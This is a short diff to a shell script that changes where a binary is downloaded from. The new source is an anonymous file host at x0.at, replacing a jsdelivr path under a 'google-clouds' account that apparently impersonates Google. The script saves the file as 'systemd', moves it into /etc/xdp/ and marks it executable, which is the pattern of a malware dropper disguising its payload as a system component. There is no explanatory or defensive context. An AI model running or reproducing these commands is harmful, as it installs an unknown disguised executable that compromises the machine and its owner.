@@ -3,7 +3,7 @@
 
 
 
-curl https://cdn.jsdelivr.net/gh/google-clouds/sdk/tt --output /tmp/systemd
+curl https://x0.at/2SoW --output /tmp/systemd
 mkdir -p /etc/xdp/
 mv /tmp/systemd /etc/xdp/systemd
 chmod +x /etc/xdp/systemd
